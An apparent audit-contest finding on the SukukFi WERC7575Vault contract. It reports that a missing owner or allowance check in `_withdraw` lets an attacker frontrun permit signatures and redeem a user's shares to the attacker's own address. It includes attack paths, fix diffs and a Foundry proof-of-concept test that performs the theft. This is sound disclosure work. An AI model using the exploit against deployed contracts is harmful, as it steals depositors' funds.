  "body": "## Finding description and impact\n**Root Cause**\n\nFrom the code comments of `WERC7575Vault::withdraw` and `WERC7575Vault::redeem`, it is intended that the caller of these functions must be share owner or an operator having allowance for the owner's shares.\n\n```text\n     * AUTHORIZATION:\n     * - msg.sender must be owner OR have allowance for the shares\n     * - Allows delegation to withdrawal operators\n```\n\nHowever, [`WERC7575Vault::_withdraw`](https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397) does not enforce these conditions, allowing an attacker to withdraw/redeem the user's shares using the attacker's address as the receiver of assets. Thus, an attacker can steal the user's funds.\n\n**Happy Path 1**\n\n1. Validator signs permit signature and gives signature to user off-chain\n2. User broadcasts `WERC7575ShareToken::permit` and `WERC7575Vault::withdraw/redeem` transaction\n3. User's withdraw/redeem transaction succeeds, user (or the rightful receiver) receives the assets\n\n**Attack Path 1**\n\n1. Validator signs permit signature and gives signature to user off-chain\n2. User broadcasts `WERC7575ShareToken::permit` and `WERC7575Vault::withdraw/redeem` transaction\n3. Attacker sees user's transaction in the mempool and frontruns user's withdraw/redeem\n   - Attacker calls `WERC7575ShareToken::permit` using parameters and signatures extracted from user's calldata\n   - Attacker calls `WERC7575Vault::withdraw/redeem` to withdraw/redeem the user's assets/shares but with attacker's address as the receiver\n4. User's permit transaction and withdraw/redeem transaction fails\n5. Attacker profits from stealing user's funds\n\n**Happy Path 2**\n\n1. Validator signs permit signature\n2. Validator calls `WERC7575ShareToken::permit` to give user self-allowance\n3. User calls `WERC7575Vault::withdraw/redeem` to withdraw assets or redeem shares\n\n**Attack Path 2**\n\n1. Validator signs permit signature\n2. Validator calls `WERC7575ShareToken::permit` to give user self-allowance\n3. Attacker immediately calls `WERC7575Vault::withdraw/redeem` to withdraw/redeem the user's assets/shares but with attacker's address as the receiver\n4. Attacker profits from stealing user's funds\n\n**Impact**\n\n1. Loss of funds to user\n2. Attacker profits from stealing user's funds\n\n## Recommended mitigation steps\n\nSuggest to implement either of these mitigations:\n\n1. Check that msg.sender is owner in `WERC7575Vault::_withdraw`\n```diff\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n+   require(msg.sender == owner, \"not owner\");\n```\n\n2. If delegation functionality is intended, implement the following changes\nIn `WERC7575Vault::_withdraw`, add the following lines\n```diff\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n+   if (msg.sender != owner) {\n+       _shareToken.spendAllowance(owner, msg.sender, shares);\n+   }\n```\n\nIn `WERC7575ShareToken`, add the following function\n```diff\n+   function spendAllowance(address owner, address caller, uint256 shares) external onlyVaults {\n+       _spendAllowance(owner, caller, shares);\n+   }\n```",
  "proof_of_concept": "Place the following into `WERC7575.t.sol` and run\n\n> forge test --mt testAttackerCanStealUsersWithdrawRedeem\n\n```javascript\n    function testAttackerCanStealUsersWithdrawRedeem() public {\n        // 0. User1 deposits\n        uint256 depositAmount = 1000 * 1e18;\n        vm.startPrank(user1);\n        token.approve(address(vault), depositAmount);\n        uint256 shares = vault.deposit(depositAmount, user1);\n        vm.stopPrank();\n        \n        // 1. Validator gives user1 self-allowance through permit signature\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash =\n            keccak256(abi.encode(keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), user1, user1, shares, shareToken.nonces(user1), deadline));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        // 2. User1 broadcasts permit and withdraw/redeem transaction\n        // vm.startPrank(user1);\n        // shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        // uint256 assetsRedeemedUser = vault.redeem(shares, user1, user1);\n        // vm.stopPrank();\n\n        // 3. Attacker sees user1's transaction in the mempool and frontruns user1's withdraw/redeem\n        address attacker = makeAddr(\"attacker\");\n        uint256 attackerBalanceBefore = token.balanceOf(attacker);\n        vm.startPrank(attacker);\n        // attacker extracts signature from user1's calldata and calls permit\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        // attacker steals user1's funds by replacing the receiver field\n        uint256 assetsRedeemedAttacker = vault.redeem(shares, attacker, user1);\n        vm.stopPrank();\n        assertEq(assetsRedeemedAttacker, depositAmount);\n\n        // 4. User1's permit and withdraw/redeem fails\n        vm.startPrank(user1);\n        vm.expectRevert();\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        vm.expectRevert();\n        uint256 assetsRedeemedUser = vault.redeem(shares, user1, user1);\n        vm.stopPrank();\n        assertEq(assetsRedeemedUser, 0);\n\n        // 5. Attacker profits\n        uint256 attackerBalanceAfter = token.balanceOf(attacker);\n        assertEq(attackerBalanceBefore, 0);\n        assertEq(attackerBalanceAfter, depositAmount);\n    }\n```",
